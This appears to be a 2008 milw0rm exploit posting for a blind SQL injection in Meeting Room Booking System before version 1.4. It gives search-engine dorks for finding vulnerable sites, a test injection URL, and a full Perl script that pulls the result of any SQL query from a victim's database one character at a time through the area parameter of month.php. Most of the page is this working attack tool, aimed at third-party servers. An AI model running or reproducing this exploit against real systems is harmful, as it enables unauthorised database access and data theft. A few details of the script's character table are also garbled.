<html><head><title>Meeting Room Booking System (MRBS) < 1.4 SQL Injection Exploit</title></head><pre># &quot;MRBS is a system for multi-site booking of meeting rooms. Rooms are grouped by building/area and shown in a side-by-side view. Although the goal was initially to book rooms, MRBS can also be used to book any resource (computer, planes, whatever you want)&quot;.

# Web CMS: http://sourceforge.net/projects/mrbs/
# Affected: Previous versions of mrbs 1.4
# Solution: Update to Version 1.4

# Doorks:
# &quot;Meeting Room Booking System&quot; &quot;month.php?area=&quot;
# &quot;Meeting Room Booking System&quot; &quot;day.php?area=&quot;
# &quot;Meeting Room Booking System&quot; &quot;week.php?area=&quot;

# Author: Xianur0
# Try: http://www.sitio.com/path/month.php?area=1/**/and/**/1=0

# Exploit:

#!/usr/bin/perl

#Xianur0 CYS # perl blind.pl http://www.victima/st/schedule/ 'SELECT user()'
#
#Exploit MRBS By Xianur0
#
#Please Have Patience, The Blind SQL Injection is running.........
#pma@localhost
#
#
#Finished!
#


# By Xianur0

  use LWP::UserAgent;

%ascii = (&quot;32&quot;, &quot; &quot;,&quot;32&quot;, &quot; &quot;,&quot;33&quot;, &quot;!&quot;,&quot;34&quot;, '&quot;',&quot;35&quot;, &quot;#&quot;,&quot;36&quot;, '$',&quot;37&quot;, &quot;%&quot;,&quot;38&quot;, &quot;&amp;&quot;,&quot;39&quot;, &quot;'&quot;,&quot;40&quot;, &quot;(&quot;,&quot;41&quot;, &quot;)&quot;,&quot;42&quot;, &quot;*&quot;,&quot;43&quot;, &quot;+&quot;,&quot;44&quot;, &quot;,&quot;,&quot;45&quot;, &quot;-&quot;,&quot;46&quot;, &quot;.&quot;,&quot;47&quot;, &quot;/&quot;,&quot;48&quot;, &quot;0&quot;,&quot;49&quot;, &quot;1&quot;,&quot;50&quot;, &quot;2&quot;,&quot;51&quot;, &quot;3&quot;,&quot;52&quot;, &quot;4&quot;,&quot;53&quot;, &quot;5&quot;,&quot;54&quot;, &quot;6&quot;,&quot;55&quot;, &quot;7&quot;,&quot;56&quot;, &quot;8&quot;,&quot;57&quot;, &quot;9&quot;,&quot;58&quot;, &quot;:&quot;,&quot;59&quot;, &quot;;&quot;,&quot;60&quot;, &quot;&lt;&quot;,&quot;61&quot;, &quot;+&quot;,&quot;62&quot;, &quot;&gt;&quot;,&quot;63&quot;, &quot;?&quot;,&quot;64&quot;, '@',&quot;65&quot;,&quot;A&quot;,&quot;66&quot;,&quot;B&quot;,&quot;67&quot;,&quot;C&quot;,&quot;68&quot;,&quot;D&quot;,&quot;69&quot;,&quot;E&quot;,&quot;70&quot;,&quot;F&quot;,&quot;71&quot;,&quot;G&quot;,&quot;72&quot;,&quot;H&quot;,&quot;73&quot;,&quot;I&quot;,&quot;74&quot;,&quot;J&quot;,&quot;75&quot;,&quot;K&quot;,&quot;76&quot;,&quot;L&quot;,&quot;77&quot;,&quot;M&quot;,&quot;78&quot;,&quot;N&quot;,&quot;79&quot;,&quot;O&quot;,&quot;80&quot;,&quot;P&quot;,&quot;81&quot;,&quot;Q&quot;,&quot;82&quot;,&quot;R&quot;,&quot;83&quot;,&quot;S&quot;,&quot;84&quot;,&quot;T&quot;,&quot;85&quot;,&quot;U&quot;,&quot;86&quot;,&quot;V&quot;,&quot;87&quot;,&quot;W&quot;,&quot;88&quot;,&quot;X&quot;,&quot;89&quot;,&quot;Y&quot;,&quot;90&quot;,&quot;Z&quot;,&quot;95&quot;,&quot;_&quot;,&quot;97&quot;, &quot;a&quot;, &quot;98&quot;, &quot;b&quot;, &quot;99&quot;, &quot;c&quot;, &quot;100&quot;, ,&quot;d&quot;,&quot;101&quot;,&quot;e&quot;, &quot;102&quot;, &quot;f&quot;, &quot;103&quot;,&quot;g&quot;, &quot;104&quot;, &quot;h&quot;, &quot;105&quot;,&quot;i&quot;, &quot;106&quot;, &quot;j&quot;, &quot;107&quot;,&quot;k&quot;, &quot;108&quot;, &quot;l&quot;, &quot;109&quot;,&quot;m&quot;, &quot;110&quot;, &quot;n&quot;, &quot;111&quot;,&quot;o&quot;, &quot;112&quot;, &quot;p&quot;, &quot;113&quot;,&quot;q&quot;, &quot;114&quot;, &quot;r&quot;, &quot;115&quot;,&quot;s&quot;, &quot;116&quot;, &quot;t&quot;, &quot;117&quot;,&quot;u&quot;, &quot;118&quot;, &quot;v&quot;, &quot;119&quot;,&quot;w&quot;, &quot;120&quot;, &quot;x&quot;, &quot;121&quot;,&quot;y&quot;, &quot;122&quot;, &quot;z&quot;);

  $ua = LWP::UserAgent-&gt;new;
  $ua-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17&quot;);
$url = $ARGV[0];
$sql = $ARGV[1] || die(&quot;Use: blind.pl [Complete URL] [SQL Injection]\nExample: blind.pl http://www.victima.com/mrbs/ 'SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES'\n&quot;);
print &quot;\nExploit MRBS By Xianur0 \n\nPlease Have Patience, The Blind SQL Injection is running.........\n&quot;;
$caracter = 1;
$i=0;
$detector = '&lt;h1&gt;No rooms defined for this area&lt;/h1&gt;';
$simbolo = &quot;&gt;&quot;;
while($caracter ne &quot;finito&quot;) {
  $req = HTTP::Request-&gt;new(GET =&gt; $url.'/month.php?year=2008&amp;month=08&amp;area=1%20AND ascii(substring(('.$sql.'),'.$caracter.',1)) '.$simbolo.' '.$i);
  $req-&gt;header('Accept' =&gt; 'text/html');
  $res = $ua-&gt;request($req);
  if ($res-&gt;is_success) {
     if($res-&gt;content !~ $detector) {
if($base eq $i) { print &quot;$ascii{$i}&quot;; $caracter++; $i=0; $simbolo = &quot;&gt;&quot;;}
$base = $i;
$i = $i+10;
} else { if($i eq 0) { print &quot;\nError Performing Blind (Less Value to 0)!\n&quot;; $caracter = &quot;finito&quot;;} else {$i = $i-1; $simbolo = &quot;=&quot;;}
}
  } else {
     print &quot;\nError detected in HTTP requests: &quot; . $res-&gt;status_line . &quot;!\n&quot;;
  }
}

print &quot;\nFinished!\n&quot;;

# milw0rm.com [2008-10-18]</pre></html>